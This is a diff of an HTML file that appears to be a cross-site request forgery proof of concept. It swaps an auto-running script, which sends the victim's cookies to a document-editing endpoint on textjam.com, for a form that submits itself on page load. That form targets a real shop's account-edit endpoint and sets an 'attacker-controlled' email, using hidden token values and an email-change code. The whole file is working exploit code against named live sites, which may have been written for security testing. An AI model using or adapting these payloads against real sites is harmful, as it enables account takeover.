@@ -1,15 +1,29 @@
 <!DOCTYPE html>
-<script>
-// Auto-execute on page load
-fetch('https://textjam.com/api/doc/U81M7E5V/access/public/editor', {
-    method: 'POST',
-    credentials: 'include',  // Send cookies
-    mode: 'no-cors'         // Bypass CORS
-}).catch(() => {}); // Ignore errors
+<html>
+  <body onload="document.forms[0].submit()">
 
-// Redirect immediately
-setTimeout(() => {
-    window.location.href = 'https://textjam.com/api/doc/U81M7E5V';
-}, 300);
-</script>
+    <form action="https://silvergoldbull.com/customer/account/editPost/"
+          method="POST"
+          enctype="multipart/form-data">
+
+      <!-- If CSRF exists, these values should NOT be required or should be reusable -->
+
+      <input type="hidden" name="form_key" value="QCeXLHQBsCXPN0mo" />
+      <input type="hidden" name="__KEY" value="d728a8188002a2276ad4c61391781751587042d56fa61ada279f85c8dd8eb34ae56aff8a6fc34d2126f41a4cddbee95e38f4f32ac16e71710a02ee5302cd6e2e" />
+
+      <input type="hidden" name="firstname" value="Muftimandy" />
+      <input type="hidden" name="lastname" value="Mufti2" />
+
+      <!-- Attacker-controlled email -->
+      <input type="hidden" name="email" value="laurazhazira@gmail.com" />
+
+      <!-- These SHOULD break CSRF if validated -->
+      <input type="hidden" name="new_email_code" value="3209FA" />
+
+
+    </form>
+
+  </body>
+</html>
+
 
